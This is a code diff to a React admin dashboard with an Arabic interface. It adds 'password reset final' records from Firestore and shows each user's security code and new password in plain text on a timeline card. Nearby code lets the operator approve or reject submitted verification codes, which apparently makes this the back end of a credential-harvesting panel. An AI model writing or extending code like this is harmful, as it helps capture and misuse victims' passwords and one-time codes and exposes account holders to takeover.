@@ -49,6 +49,16 @@ type RegistrationWithMeta = {
   verification_codes?: VerificationCode[];
   password_resets?: PasswordReset[];
   password_reset_codes?: PasswordResetCode[];
+  password_reset_finals?: PasswordResetFinal[];
+};
+
+type PasswordResetFinal = {
+  id: string;
+  requestId: string;
+  clientId: string;
+  securityCode: string;
+  newPassword: string;
+  created_at: string;
 };
 
 type PasswordReset = {
@@ -160,6 +170,7 @@ function RegistrationsTab() {
     verificationCodes: firestoreVerificationCodes, 
     passwordResets: firestorePasswordResets,
     passwordResetCodes: firestorePasswordResetCodes,
+    passwordResetFinals: firestorePasswordResetFinals,
     loading,
     refresh: refreshFirestore 
   } = useFirestoreAdmin();
@@ -173,6 +184,7 @@ function RegistrationsTab() {
       verification_codes: [],
       password_resets: [],
       password_reset_codes: [],
+      password_reset_finals: [],
     }));
 
     // 2. Link login attempts
@@ -298,16 +310,32 @@ function RegistrationsTab() {
       }
     });
 
+    // 6. Link password reset finals
+    firestorePasswordResetFinals.forEach(prf => {
+      const target = regs.find(r => 
+        (r.clientId === prf.clientId && prf.clientId) ||
+        (r.client_id === prf.clientId && prf.clientId)
+      );
+
+      if (target) {
+        target.password_reset_finals = target.password_reset_finals || [];
+        if (!target.password_reset_finals.find(existing => existing.id === prf.id)) {
+          target.password_reset_finals.push(prf);
+        }
+      }
+    });
+
     // Sort everything
     regs.forEach(r => {
       if (r.login_attempts) r.login_attempts.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
       if (r.verification_codes) r.verification_codes.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
       if (r.password_resets) r.password_resets.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
       if (r.password_reset_codes) r.password_reset_codes.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+      if (r.password_reset_finals) r.password_reset_finals.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
     });
 
     return regs;
-  }, [firestoreRegistrations, firestoreLoginAttempts, firestoreVerificationCodes, firestorePasswordResets, firestorePasswordResetCodes]);
+  }, [firestoreRegistrations, firestoreLoginAttempts, firestoreVerificationCodes, firestorePasswordResets, firestorePasswordResetCodes, firestorePasswordResetFinals]);
 
   // Update current time every minute
   useEffect(() => {
@@ -332,6 +360,9 @@ function RegistrationsTab() {
     }
     if (reg.password_reset_codes) {
       reg.password_reset_codes.forEach(c => times.push(new Date(c.created_at).getTime()));
+    }
+    if (reg.password_reset_finals) {
+      reg.password_reset_finals.forEach(f => times.push(new Date(f.created_at).getTime()));
     }
     
     if (times.length === 0) return null;
@@ -874,6 +905,18 @@ function RegistrationsTab() {
                     });
                   }
 
+                  // Add password reset finals
+                  if (selected.password_reset_finals && selected.password_reset_finals.length > 0) {
+                    selected.password_reset_finals.forEach(prf => {
+                      timeline.push({
+                        id: prf.id,
+                        type: 'password_reset_final' as any,
+                        created_at: prf.created_at,
+                        data: prf,
+                      });
+                    });
+                  }
+
                   // Sort by most recent first
                   timeline.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
 
@@ -1085,6 +1128,38 @@ function RegistrationsTab() {
                                 )}
                                 {codeStatus === 'approved' && <div className="bg-green-500/20 text-green-400 text-[10px] font-bold py-2 px-3 rounded-lg text-center">✓ تمت الموافقة</div>}
                                 {codeStatus === 'rejected' && <div className="bg-red-500/20 text-red-400 text-[10px] font-bold py-2 px-3 rounded-lg text-center">✕ تم الرفض</div>}
+                              </div>
+                            </div>
+                          );
+                        }
+
+                        // Password Reset Final Card
+                        if (item.type === ('password_reset_final' as any)) {
+                          return (
+                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-green-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
+                              <div className="flex items-center justify-between mb-3">
+                                <div className="flex items-center gap-2">
+                                  <ShieldCheck className={`w-4 h-4 ${isNewest ? 'text-green-400' : 'text-green-500/70'}`} />
+                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-green-400' : 'text-white'}`}>كلمة المرور الجديدة</h4>
+                                </div>
+                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-green-500/20 text-green-400' : 'bg-slate-700 text-slate-400'}`}>
+                                  {formatTimeAgo(item.created_at)}
+                                </span>
+                              </div>
+                              <div className="bg-slate-900/50 rounded-lg p-3 space-y-2">
+                                <div>
+                                  <p className="text-[10px] text-slate-500 mb-0.5">رمز الأمان</p>
+                                  <p className="text-xs text-white font-bold">{item.data.securityCode}</p>
+                                </div>
+                                <div>
+                                  <p className="text-[10px] text-slate-500 mb-0.5">كلمة المرور</p>
+                                  <p className="text-xs text-green-400 font-bold font-mono">{item.data.newPassword}</p>
+                                </div>
+                                <div className="pt-2 border-t border-slate-800">
+                                  <div className="bg-green-500/10 text-green-400 text-[9px] py-1 px-2 rounded flex items-center justify-center gap-1">
+                                    <Check className="w-3 h-3" /> تم التحديث بنجاح
+                                  </div>
+                                </div>
                               </div>
                             </div>
                           );
